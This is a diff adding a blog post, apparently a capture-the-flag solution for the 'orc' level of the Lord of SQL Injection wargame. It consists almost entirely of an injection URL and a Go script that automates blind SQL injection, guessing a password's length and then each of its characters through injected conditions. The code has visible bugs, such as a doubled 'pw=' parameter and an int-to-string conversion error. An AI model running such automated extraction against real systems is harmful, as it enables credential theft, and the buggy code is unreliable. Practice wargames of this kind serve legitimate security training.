@@ -1,0 +1,430 @@
+---
+layout: post
+title: LOS Orc 
+date: 2015-09-14 12:24:00 +0900
+category: Hacking 
+---
+```
+https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php?pw=%27%20or%20%20ascii(substr(pw,1,1))%3C150%23
+```
+
+```
+
+package main
+
+
+
+import (
+
+	"bytes"
+
+	"fmt"
+
+	"io/ioutil"
+
+	"log"
+
+	"net/http"
+
+	"regexp"
+
+	"strconv"
+
+	"time"
+
+)
+
+
+
+const COOKIEVALUE string = ""
+
+
+
+var limit int = 50
+
+var index int = 0
+
+var payload []string
+
+var pwLength int = 0
+
+
+
+func main() {
+
+	//requestPost()
+
+	getLength(50)
+
+	fmt.Println(strconv.Itoa(pwLength))
+
+	index = 0
+
+	blidSqlInjection(0, 0)
+
+	fmt.Println("%v", payload)
+
+}
+
+
+
+func matchFind(targetString string) bool {
+
+	r, _ := regexp.Compile("<h2>Hello.*</h2>")
+
+	var result []string
+
+
+
+	result = r.FindAllString(targetString, -1)
+
+	if len(result) > 0 {
+
+		return true
+
+	} else {
+
+		return false
+
+	}
+
+}
+
+
+
+func requestPost() {
+
+	url := "https://los.rubiya.kr/gate.php"
+
+
+
+	data := []byte(`{"hello": "world"}`)
+
+
+
+	req, err := http.NewRequest("POST", url, bytes.NewBuffer(data))
+
+	if err != nil {
+
+		log.Fatal("Error reading request. ", err)
+
+	}
+
+
+
+	// Set headers
+
+	req.Header.Set("Content-Type", "application/json")
+
+	req.Header.Set("Host", "httpbin.org")
+
+
+
+	// Create and Add cookie to request
+
+	cookie := http.Cookie{Name: "PHPSESSID", Value: COOKIEVALUE}
+
+	req.AddCookie(&cookie)
+
+
+
+	// Set client timeout
+
+	client := &http.Client{Timeout: time.Second * 10}
+
+
+
+	// Validate cookie and headers are attached
+
+	fmt.Println(req.Cookies())
+
+	fmt.Println(req.Header)
+
+
+
+	// Send request
+
+	resp, err := client.Do(req)
+
+	if err != nil {
+
+		log.Fatal("Error reading response. ", err)
+
+	}
+
+	defer resp.Body.Close()
+
+
+
+	fmt.Println("response Status:", resp.Status)
+
+	fmt.Println("response Headers:", resp.Header)
+
+
+
+	body, err := ioutil.ReadAll(resp.Body)
+
+	if err != nil {
+
+		log.Fatal("Error reading body. ", err)
+
+	}
+
+
+
+	fmt.Printf("%s\n", body)
+
+
+
+}
+
+
+
+func getLength(start int) int {
+
+	//https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php?pw=%27%20or%20%20ascii(substr(pw,1,1))%3C150%23
+
+
+
+	if index >= limit || start == 0 {
+
+		return -1
+
+	}
+
+	url1 := "https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php?pw=pw=%27%20or%20%20length(pw)="
+
+	url2 := strconv.Itoa(start) + "%23"
+
+
+
+	data := []byte(`{"hello": "world"}`)
+
+
+
+	url := url1 + url2
+
+	fmt.Println("Request URL : ", url)
+
+	req, err := http.NewRequest("GET", url, bytes.NewBuffer(data))
+
+	if err != nil {
+
+		log.Fatal("Error reading request. ", err)
+
+	}
+
+
+
+	// Set headers
+
+	req.Header.Set("Content-Type", "application/json")
+
+
+
+	// Create and Add cookie to request
+
+	cookie := http.Cookie{Name: "PHPSESSID", Value: COOKIEVALUE}
+
+	req.AddCookie(&cookie)
+
+
+
+	// Set client timeout
+
+	client := &http.Client{Timeout: time.Second * 10}
+
+
+
+	// Send request
+
+	resp, err := client.Do(req)
+
+	if err != nil {
+
+		log.Fatal("Error reading response. ", err)
+
+	}
+
+	defer resp.Body.Close()
+
+
+
+	//fmt.Println("response Status:", resp.Status)
+
+
+
+	body, err := ioutil.ReadAll(resp.Body)
+
+	if err != nil {
+
+		log.Fatal("Error reading body. ", err)
+
+	}
+
+
+
+	matchResult := matchFind(string(body))
+
+
+
+	if matchResult == true {
+
+		fmt.Println("Length : ", strconv.Itoa(start))
+
+		pwLength = start
+
+		return start
+
+	}
+
+
+
+	index++
+
+
+
+	if matchResult == true {
+
+		getLength(start / 2)
+
+	} else {
+
+		getLength(start - 1)
+
+	}
+
+
+
+	return -1
+
+}
+
+
+
+func blidSqlInjection(start int, pwIndex int) int {
+
+	//https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php?pw=%27%20or%20%20ascii(substr(pw,1,1))%3C150%23
+
+
+
+	fmt.Println(index, start, pwLength, pwIndex)
+
+	if start == pwLength && pwLength == pwIndex {
+
+		return -1
+
+	}
+
+
+
+	if pwLength < pwIndex {
+
+		return -1
+
+	}
+
+	url1 := "https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php?pw=pw=%27%20or%20%20ascii(substr(pw," + strconv.Itoa(pwIndex) + ",1))="
+
+	url2 := strconv.Itoa(start) + "%23"
+
+
+
+	data := []byte(`{"hello": "world"}`)
+
+
+
+	url := url1 + url2
+
+	fmt.Println("Request URL : ", url)
+
+	req, err := http.NewRequest("GET", url, bytes.NewBuffer(data))
+
+	if err != nil {
+
+		log.Fatal("Error reading request. ", err)
+
+	}
+
+
+
+	// Set headers
+
+	req.Header.Set("Content-Type", "application/json")
+
+
+
+	// Create and Add cookie to request
+
+	cookie := http.Cookie{Name: "PHPSESSID", Value: COOKIEVALUE}
+
+	req.AddCookie(&cookie)
+
+
+
+	// Set client timeout
+
+	client := &http.Client{Timeout: time.Second * 10}
+
+
+
+	// Send request
+
+	resp, err := client.Do(req)
+
+	if err != nil {
+
+		log.Fatal("Error reading response. ", err)
+
+	}
+
+	defer resp.Body.Close()
+
+
+
+	//fmt.Println("response Status:", resp.Status)
+
+
+
+	body, err := ioutil.ReadAll(resp.Body)
+
+	if err != nil {
+
+		log.Fatal("Error reading body. ", err)
+
+	}
+
+
+
+	matchResult := matchFind(string(body))
+
+
+
+	index++
+
+	if matchResult == true {
+
+		//fmt.Println("Length : ", strconv.Itoa(start))
+
+		//return start
+
+		payload = append(payload, string(start))
+
+		blidSqlInjection(0, pwIndex+1)
+
+	} else {
+
+		blidSqlInjection(start+1, pwIndex)
+
+	}
+
+
+
+	return -1
+
+}
+
+
+
+```
+
